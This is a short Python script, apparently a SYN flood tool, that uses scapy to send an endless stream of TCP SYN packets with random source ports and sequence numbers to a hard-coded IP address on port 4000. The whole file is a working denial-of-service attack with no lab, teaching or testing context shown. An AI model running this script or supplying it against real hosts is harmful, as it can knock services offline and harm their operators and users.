import random
import time
from scapy.all import IP, TCP, send, conf

target_ip = "128.10.250.50"
target_port = 4000

conf.verb = 0

while True:
    src_port = random.randint(1024, 65535)
    seq_num = random.randint(0, 4294967295)
    ip = IP(dst=target_ip)
    syn = TCP(sport=src_port, dport=target_port, flags="S", seq=seq_num)

    packet = ip / syn
    send(packet)

    print(f"SENT SYN FROM PORT {src_port} AND SEQ{seq_num}")

